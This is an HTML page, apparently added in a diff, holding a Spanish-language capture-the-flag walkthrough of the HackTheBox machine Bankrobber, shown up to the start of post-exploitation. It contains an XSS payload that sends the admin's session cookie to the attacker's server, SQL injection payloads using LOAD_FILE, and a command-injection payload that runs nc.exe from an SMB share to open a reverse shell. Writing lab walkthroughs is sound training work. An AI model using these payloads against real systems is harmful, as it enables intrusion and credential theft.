@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Writeup Drive</title>
+ <link rel="stylesheet" href="/assets/css/styles_machine.css" />
+ <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
+ <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
+ <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">    
+</head>
+<body>
+  <div class="menu">
+    <div id="mySidepanel" class="sidepanel">
+        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
+        <a href="/htb">HackTheBox</a>
+        <a href="/">Home</a>
+        <a href="https://mrpr1ngl3s.github.io/blog">Blog</a>
+    </div>
+    
+    <button class="openbtn" onclick="openNav()">☰</button>  
+</div>
+<script>
+function openNav() {
+if (window.innerWidth <= 1000) {
+    document.getElementById("mySidepanel").style.display = "block";
+} else {
+    document.getElementById("mySidepanel").style.width = "25%";
+}
+}
+
+function closeNav() {
+if (window.innerWidth <= 1000) {
+    document.getElementById("mySidepanel").style.display = "none";
+} else {
+    document.getElementById("mySidepanel").style.width = "0";
+}
+
+}
+
+</script>
+
+  <div class="main">
+<a href="https://app.hackthebox.com/machines/Drive/"  target="_blank"><img style="float: right; margin-left:60px; height:90px;" src="/img/Bankrobber.png"/></a>
+
+<h1 id="bankrobber">Bankrobber</h1>
+<h2 id="enumeración">Enumeración</h2>
+<p>Iniciamos con la máquina comprobando la conectividad realizando un <strong>ping</strong> a la IP <strong>10.10.10.154</strong>.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>❯ <span class="fu">ping</span> -c 1 10.10.10.154</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="ex">PING</span> 10.10.10.154 (10.10.10.154) <span class="ex">56</span>(84) <span class="ex">bytes</span> of data.</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">64</span> bytes from 10.10.10.154: icmp_seq=1 ttl=127 time=99.8 ms</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="ex">---</span> 10.10.10.154 ping statistics ---</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">1</span> packets transmitted, 1 received, 0% packet loss, time 0ms</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="ex">rtt</span> min/avg/max/mdev = 99.789/99.789/99.789/0.000 ms</span></code></pre></div>
+<p>En el output del comando ejecutado en el parámetro <strong>ttl</strong> se ve que el valor está más cerca del <strong>128</strong> que del <strong>64</strong>, gracias a este parámetro se puede saber el sistema operativo que se está utilizando, en este caso un Windows.</p>
+<table>
+<thead>
+<tr class="header">
+<th>TTL</th>
+<th>OS</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>64</td>
+<td>GNU/Linux</td>
+</tr>
+<tr class="even">
+<td>128</td>
+<td>Windows</td>
+</tr>
+</tbody>
+</table>
+<p>Vamos a utilizar la herramienta <strong>Nmap</strong> para escanear los puertos que estén abiertos y servicios que están asociados a estos.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="fu">nmap</span> -p- --open -sCV -n --min-rate 5000 -Pn 10.10.10.154 -oN Scan</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 8%" />
+<col style="width: 91%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-p-</td>
+<td>Indica que analice todos los puertos del 1 al 65535</td>
+</tr>
+<tr class="even">
+<td>–open</td>
+<td>Únicamente se escanearan los puertos que estén abiertos</td>
+</tr>
+<tr class="odd">
+<td>-sC</td>
+<td>Lanza scripts que tiene Nmap por defecto para detectar el tipo de servicio que este corriendo en un puerto</td>
+</tr>
+<tr class="even">
+<td>-sV</td>
+<td>Lanza scripts que tiene Nmap para saber que versión están utilizando los servicios</td>
+</tr>
+<tr class="odd">
+<td>-n</td>
+<td>Se evita realizar resolución DNS</td>
+</tr>
+<tr class="even">
+<td>–min-rate</td>
+<td>Indica la cantidad de paquetes que se envían por segundo, en este caso 5000</td>
+</tr>
+<tr class="odd">
+<td>-Pn</td>
+<td>Deshabilita la búsqueda del host, solamente manda los paquetes a los puertos.</td>
+</tr>
+<tr class="even">
+<td>-oN</td>
+<td>Exporta el output del comando ejecutado a un archivo en formato nmap</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.93 ( https://nmap.org ) <span class="ex">at</span> 2025-02-21 14:47 CET</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 10.10.10.154</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a><span class="ex">Host</span> is up (0.100s latency)<span class="ex">.</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a><span class="ex">Not</span> shown: 65531 filtered tcp ports (no-response)</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a><span class="ex">Some</span> closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a><span class="ex">PORT</span>     STATE SERVICE      VERSION</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a><span class="ex">80/tcp</span>   open  http         Apache httpd 2.4.39 ((Win64) <span class="ex">OpenSSL/1.1.1b</span> PHP/7.3.4)</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-title</span>: E-coin</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-server-header</span>: Apache/2.4.39 (Win64) <span class="ex">OpenSSL/1.1.1b</span> PHP/7.3.4</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a><span class="ex">443/tcp</span>  open  ssl/http     Apache httpd 2.4.39 ((Win64) <span class="ex">OpenSSL/1.1.1b</span> PHP/7.3.4)</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-server-header</span>: Apache/2.4.39 (Win64) <span class="ex">OpenSSL/1.1.1b</span> PHP/7.3.4</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_ssl-date</span>: TLS randomness does not represent time</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">tls-alpn</span>: </span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  http/1.1</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ssl-cert</span>: Subject: commonName=localhost</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2009-11-10T23:48:47</span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2019-11-08T23:48:47</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-title</span>: E-coin</span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true"></a><span class="ex">445/tcp</span>  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true"></a><span class="ex">3306/tcp</span> open  mysql        MariaDB (unauthorized)</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true"></a><span class="ex">Service</span> Info: Host: BANKROBBER<span class="kw">;</span> <span class="ex">OS</span>: Windows<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:microsoft:windows</span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true"></a></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true"></a><span class="ex">Host</span> script results:</span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">smb2-time</span>: </span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">date</span>: 2025-02-21T13:51:05</span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  start_date: 2025-02-20T18:52:33</span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_clock-skew</span>: mean: 5s, deviation: 0s, median: 4s</span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">smb2-security-mode</span>: </span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">311</span>: </span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>    Message signing enabled but not required</span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">smb-security-mode</span>: </span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">account_used</span>: guest</span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">authentication_level</span>: user</span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">challenge_response</span>: supported</span>
+<span id="cb3-35"><a href="#cb3-35" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  message_signing: disabled (dangerous, but default)</span>
+<span id="cb3-36"><a href="#cb3-36" aria-hidden="true"></a></span>
+<span id="cb3-37"><a href="#cb3-37" aria-hidden="true"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span id="cb3-38"><a href="#cb3-38" aria-hidden="true"></a><span class="ex">Nmap</span> done: 1 IP address (1 host up) <span class="ex">scanned</span> in 220.66 seconds</span></code></pre></div>
+<p>Los puertos que se han descubierto son:</p>
+<table>
+<thead>
+<tr class="header">
+<th>Puertos</th>
+<th>Servicio</th>
+<th>Versión</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>80</td>
+<td>HTTP</td>
+<td>Apache httpd 2.4.39</td>
+</tr>
+<tr class="even">
+<td>445</td>
+<td>microsoft-ds</td>
+<td>SMB v2.1</td>
+</tr>
+<tr class="odd">
+<td>3306</td>
+<td>mysql</td>
+<td>MariaDB (unauthorized)</td>
+</tr>
+</tbody>
+</table>
+<p>Si utilizamos la herramienta <strong>crackmapexec</strong> vemos que se trata de un <strong>Windows 10</strong> y tiene como dominio <strong>Bankrobber</strong>.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a>❯ <span class="ex">crackmapexec</span> smb 10.10.10.154</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="ex">SMB</span>         10.10.10.154    445    BANKROBBER       [*] Windows 10 Pro 14393 (name:BANKROBBER) <span class="kw">(</span><span class="ex">domain</span>:Bankrobber<span class="kw">)</span> <span class="kw">(</span><span class="ex">signing</span>:False<span class="kw">)</span> <span class="kw">(</span><span class="ex">SMBv1</span>:True<span class="kw">)</span></span></code></pre></div>
+<p>Al acceder a la pagina encontramos un apartado para poder registrarse e iniciar sesión.</p>
+<p><img src="Img/Pasted image 20250221170524.png"></p>
+<p><img src="Img/Pasted image 20250221170611.png"></p>
+<p>Nos creamos una cuenta y accedemos</p>
+<p><img src="Img/Pasted image 20250221171436.png"></p>
+<p>Al acceder, vemos que nos aparece un apartado donde ponemos realiza una transferencia de E-coins.</p>
+<p><img src="Img/Pasted image 20250221171520.png"></p>
+<p>Al enviar una cantidad para realizar una prueba, nos aparece un pop-up donde nos indica que la transferencia será revisada por el usuario <strong>admin</strong>.</p>
+<p><img src="Img/Pasted image 20250221171608.png"></p>
+<p><img src="Img/Pasted image 20250221171620.png"></p>
+<p>Viendo esto, vamos a probar con realizar un <strong>XSS</strong>, para para proba si es vulnerable a este, enviando una petición a nuestro servidor HTTP.</p>
+<p><img src="Img/Pasted image 20250221174044.png"></p>
+<p>Y efectivamente, recibimos una petición del usuario admin.</p>
+<p><img src="Img/Pasted image 20250221174531.png"></p>
+<p>Si revisamos nuestra cookie de sesión para verificar si la variable <strong>HttpOnly</strong> está desactivada y así intentar realizar un <strong>Cookie Hijacking</strong>, vemos que no solo está desactivada, sino que también está codificada en <strong>Base64</strong>. Sin embargo, al estar también <strong>urlencodeada</strong>, el signo <strong>=</strong> se representa como <strong>%3D</strong>.</p>
+<p><img src="Img/Pasted image 20250222114647.png"></p>
+<p>Tras decodificarlo, vemos que son la <strong>password</strong> y el <strong>username</strong> del usuario que hemos creado.</p>
+<p><img src="Img/Pasted image 20250222114959.png"></p>
+<p>Por tanto si conseguimos la cookie de sesión del usuario <strong>admin</strong>, podremos conseguir sus credenciales y acceder como este.</p>
+<p>Creamos un recurso en <strong>JavaScript</strong> que envié por el método <strong>GET</strong> la cookie de sesión al servidor <strong>HTTP</strong>, y para que la solicitud sea asíncrona y permita que el código siga ejecutándose sin bloquear la página, añadimos <strong>true</strong>.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="kw">var</span> request <span class="op">=</span> <span class="kw">new</span> <span class="bu">XMLHttpRequest</span>()<span class="op">;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a>request<span class="op">.</span><span class="fu">open</span>(<span class="st">&quot;GET&quot;</span><span class="op">,</span> <span class="st">&quot;http://10.10.14.13/?c=&quot;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="op">,</span> <span class="kw">true</span>)<span class="op">;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a>request<span class="op">.</span><span class="fu">send</span>()<span class="op">;</span></span></code></pre></div>
+<p>Enviamos el <strong>XSS</strong> con la petición hacia el recurso <strong>JavaScript</strong>.</p>
+<p><img src="Img/Pasted image 20250222130439.png"></p>
+<p>Ahora si esperamos un poco, recibimos la petición GET.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a>❯ <span class="ex">python3</span> -m http.server 80</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="ex">Serving</span> HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) <span class="ex">...</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="ex">10.10.10.154</span> - - [22/Feb/2025 19:41:43] <span class="st">&quot;GET /cookies.js HTTP/1.1&quot;</span> 200 -</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="ex">10.10.10.154</span> - - [22/Feb/2025 19:41:43] <span class="st">&quot;GET /?c=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1&quot;</span> 200 -</span></code></pre></div>
+<p>Decodificamos las cookies</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a>❯ <span class="bu">echo</span> <span class="st">&quot;YWRtaW4=&quot;</span> <span class="kw">|</span> <span class="ex">base64</span> -d<span class="kw">;</span> <span class="bu">echo</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="ex">admin</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a>❯ <span class="bu">echo</span> <span class="st">&quot;SG9wZWxlc3Nyb21hbnRpYw==&quot;</span> <span class="kw">|</span> <span class="ex">base64</span> -d<span class="kw">;</span> <span class="bu">echo</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a><span class="ex">Hopelessromantic</span></span></code></pre></div>
+<p>Y accedemos con las nuevas credenciales.</p>
+<p><img src="Img/Pasted image 20250222131530.png"></p>
+<p>Al acceder, nos muestran varios apartados</p>
+<p><img src="Img/Pasted image 20250222135114.png"><img src="Img/Pasted image 20250222134243.png"></p>
+<p>En el apartado de buscar usuarios, podemos ingresar un <strong>ID</strong>, y nos muestra el usuario correspondiente a dicho ID.</p>
+<p><img src="Img/Pasted image 20250222134934.png"></p>
+<p>Si miramos en el encabezado de la pagina, vemos un apartado con nombre <strong>NOTES.TXT</strong> y al acceder a este, nos muestra un archivo que indica que se deben mover todos los archivos de la carpeta predeterminada de <strong>XAMPP</strong>.</p>
+<p><img src="Img/Pasted image 20250222135342.png"> <img src="Img/Pasted image 20250222135449.png"></p>
+<p>Si buscamos por internet, vemos que la carpeta predeterminada del XAMPP es <strong>C:/xampp/htdocs</strong>.</p>
+<p><img src="Img/Pasted image 20250222163634.png"></p>
+<p>Indagando en el apartado del comando <strong>dir</strong>, probamos con poner un comando que no sea ese, pero no nos lo permite</p>
+<p><img src="Img/Pasted image 20250222162319.png"></p>
+<p>Si ponemos el comando que se nos pide, vemos que solo es permitido si es ejecutado desde la propia maquina.</p>
+<p><img src="Img/Pasted image 20250222162559.png"></p>
+<p>interceptamos la petición con <strong>BurpSuite</strong> para saber a donde es redirigida, y vemos que es enviada a <strong>/admin/backdoorchecker.php</strong>, sin embargo, recordando que por detrás esta corriendo <strong>xampp</strong>, sabemos entonces que la ruta exacta sería <strong>C:/xampp/htdocs/admin/backdoorchecker.php</strong>.</p>
+<p><img src="Img/Pasted image 20250222163009.png"></p>
+<p>Pero al intentar acceder a la ruta deseada, no nos es posible.</p>
+<p><img src="Img/Pasted image 20250222163956.png"></p>
+<p>Siguiendo en el apartado de buscar usuarios, probamos ciertas inyecciones para ver si es vulnerable a <strong>SQLi</strong>.</p>
+<p><img src="Img/Pasted image 20250222155451.png"></p>
+<p>Y parece que si que es vulnerable a inyecciones SQL.</p>
+<p><img src="Img/Pasted image 20250222155520.png"></p>
+<p>Al realizar realizar un <strong>order by 4</strong> me salta un error, por lo que vemos que tiene 3 columnas.</p>
+<p><img src="Img/Pasted image 20250222165325.png"></p>
+<p>Pero solo nos devuelve 1 y 2.</p>
+<p><img src="Img/Pasted image 20250222165410.png"></p>
+<p>Miramos la versión del RDBMS y que usuario usuarios somos.</p>
+<p><img src="Img/Pasted image 20250222165907.png"></p>
+<p>Al enumerar la base de datos mediante varios comandos, no encontré mucho de interés, pero si nos fijamos en los usuario que tienen la variable <strong>FILE</strong> habilitada con el comando <strong>1’ UNION SELECT grantee,privilege_type,3 FROM information_schema.user_privileges WHERE privilege_type=‘FILE’– -</strong>, vemos que el usuario <strong>root</strong> si que la tiene.</p>
+<p><img src="Img/Pasted image 20250222170222.png"></p>
+<p>Por tanto podríamos leer el contenido del archivo <strong>backdoorchecker.php</strong> utilizando la función <strong>LOAD_FILE()</strong> mediante este comando <strong>1’ union select load_file(“C:/xampp/htdocs/admin/backdoorchecker.php”),2,3– -</strong>.</p>
+<p><img src="Img/Pasted image 20250222171622.png"></p>
+<p>Viendo que no nos interpreta el código <strong>PHP</strong> Interceptamos la petición con <strong>BurpSuite</strong> y así poder visualizar mejor el contenido.</p>
+<p><img src="Img/Pasted image 20250222180334.png"></p>
+<p><img src="Img/Pasted image 20250222172225.png"></p>
+<p>Vemos que comprueba el comando en busca de los caracteres <strong>$(</strong> y <strong>&amp;</strong>, utilizados para colar un comando en linux, y falla si alguno de ellos está presente.</p>
+<p><img src="Img/Pasted image 20250222180429.png"></p>
+<p><img src="Img/Pasted image 20250222182358.png"></p>
+<p>Por último, vemos que comprueba que la dirección remota sea desde la maquina y, si es así, ejecuta la función <strong>system()</strong> cogiendo la data que se envía por <strong>POST</strong> parar ser tramitada por el parámetro <strong>CMD</strong>. Por lo que viendo esto, hay una posible ejecución remota de comandos.</p>
+<p><img src="Img/Pasted image 20250222183301.png"></p>
+<p>Para poder burlar los filtros iniciales, podemos jugar con el signo pipe <strong>|</strong>, pero para que esto funcione hay que enviar la petición desde la maquina victima. Para ello jugaremos de nuevo con el <strong>XSS</strong> descubierto para que cuando el usuario <strong>admin</strong> acceda a nuestro servidor, por detrás estará ejecutando un recurso en <strong>JavaScript</strong> que enviara una petición por <strong>POST</strong> al archivo <strong>backdoorchecker.php</strong>, y al ser el usuario <strong>admin</strong> quien lo está enviando desde el localhost, el comando podrá ser ejecutado, convirtiendo el <strong>XSS</strong> en un <strong>XSRF</strong>.</p>
+<p>Vamos a realizar una prueba, enviandonos un ping, desde la maquina victima.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="kw">var</span> request <span class="op">=</span> <span class="kw">new</span> <span class="bu">XMLHttpRequest</span>()<span class="op">;</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a><span class="kw">var</span> pwn <span class="op">=</span> <span class="st">&#39;cmd=dir|ping -n 1 10.10.14.13&#39;</span><span class="op">;</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a>request<span class="op">.</span><span class="fu">open</span>(<span class="st">&quot;POST&quot;</span><span class="op">,</span> <span class="st">&quot;http://localhost/admin/backdoorchecker.php&quot;</span><span class="op">,</span> <span class="kw">true</span>)<span class="op">;</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true"></a>request<span class="op">.</span><span class="fu">setRequestHeader</span>(<span class="st">&#39;Content-Type&#39;</span><span class="op">,</span> <span class="st">&#39;application/x-www-form-urlencoded&#39;</span>)<span class="op">;</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true"></a>request<span class="op">.</span><span class="fu">send</span>(pwn)<span class="op">;</span></span></code></pre></div>
+<p><img src="Img/Pasted image 20250222192640.png"></p>
+<p>Si esperamos un poco podemos ver que recibimos la traza de la petición ICMP.</p>
+<p><img src="Img/Pasted image 20250222193434.png"></p>
+<p><img src="Img/Pasted image 20250222193456.png"></p>
+<p>Sabiendo esto, vamos a crear un servidor <strong>SMB</strong> para que se conecte y ejecute el binario <strong>nc.exe</strong> para enviarnos el binario <strong>cmd.exe</strong>.</p>
+<p>Nos descargamos el nc.exe</p>
+<p><img src="Img/Pasted image 20250222194007.png"></p>
+<p>Y ejecutamos el SMB.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a>❯ <span class="ex">impacket-smbserver</span> pwn <span class="va">$(</span><span class="bu">pwd</span><span class="va">)</span> -smb2support</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a><span class="ex">Impacket</span> v0.9.22 - Copyright 2020 SecureAuth Corporation</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a>[<span class="ex">*</span>] Config file parsed</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a>[<span class="ex">*</span>] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a>[<span class="ex">*</span>] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true"></a>[<span class="ex">*</span>] Config file parsed</span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true"></a>[<span class="ex">*</span>] Config file parsed</span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true"></a>[<span class="ex">*</span>] Config file parsed</span></code></pre></div>
+<p>creamos el recurso que enviara le petición para acceder al SMB.</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="ex">var</span> request = new XMLHttpRequest();</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a><span class="ex">var</span> pwn = <span class="st">&#39;cmd=dir|\\\\10.10.14.13\\pwn\\nc.exe 10.10.14.13 555 -e cmd.exe&#39;</span><span class="kw">;</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a><span class="ex">request.open</span>(<span class="st">&quot;POST&quot;</span>, <span class="st">&quot;http://localhost/admin/backdoorchecker.php&quot;</span>, true);</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a><span class="ex">request.setRequestHeader</span>(<span class="st">&#39;Content-Type&#39;</span>, <span class="st">&#39;application/x-www-form-urlencoded&#39;</span>);</span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a><span class="ex">request.send</span>(pwn);</span></code></pre></div>
+<p>Tras enviar el <strong>XSS</strong> y esperar rato, recibimos la shell.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a>❯ <span class="ex">rlwrap</span> nc -lvnp 555</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a><span class="ex">listening</span> on [any] 555 ...</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true"></a><span class="ex">connect</span> to [10.10.14.13] from (UNKNOWN) [<span class="ex">10.10.10.154</span>] 51883</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true"></a><span class="ex">Microsoft</span> Windows [Version 10.0.14393]</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true"></a><span class="kw">(</span><span class="ex">c</span><span class="kw">)</span> <span class="ex">2016</span> Microsoft Corporation. Alle rechten voorbehouden.</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true"></a></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true"></a><span class="ex">C</span>:\xampp\htdocs\admin<span class="op">&gt;</span></span></code></pre></div>
+<p>Dentro del directorio <strong>Desktop</strong> del usuario <strong>Cortin</strong>, podemos visualizar la primera flag.</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a><span class="fu">dir</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true"></a><span class="fu">dir</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true"></a> Volume <span class="kw">in</span> drive C has no label.</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true"></a> Volume Serial Number is 3307-A1DE</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true"></a></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true"></a> Directory of C:\Users\Cortin\Desktop</span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true"></a></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true"></a>25-04-2019  19:16    &lt;<span class="fu">DIR</span>&gt;          .</span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true"></a>25-04-2019  19:16    &lt;<span class="fu">DIR</span>&gt;          ..</span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true"></a>22-02-2025  08:30                34 user.<span class="fu">txt</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true"></a>               1 File(s)             34 bytes</span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true"></a>               2 <span class="fu">Dir</span>(s)   5.<span class="fu">203</span>.<span class="fu">873</span>.<span class="fu">792</span> bytes free</span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true"></a></span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true"></a><span class="fu">type</span> user.<span class="fu">txt</span></span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true"></a><span class="fu">type</span> user.<span class="fu">txt</span></span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true"></a>a9f*****************************</span>
+<span id="cb12-17"><a href="#cb12-17" aria-hidden="true"></a></span>
+<span id="cb12-18"><a href="#cb12-18" aria-hidden="true"></a>C:\Users\Cortin\Desktop&gt;</span></code></pre></div>
+<h2 id="post-explotación">Post-explotación</h2>
+<p>Si miramos en la raíz del sistema, vemos un binario con nombre <strong>bankv2.exe</strong> que llama la atención.</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a><span class="fu">dir</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true"></a><span class="fu">dir</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true"></a> Volume <span class="kw">in</span> drive C has no label.</span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true"></a> Volume Serial Number is 3307-A1DE</span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true"></a></span>
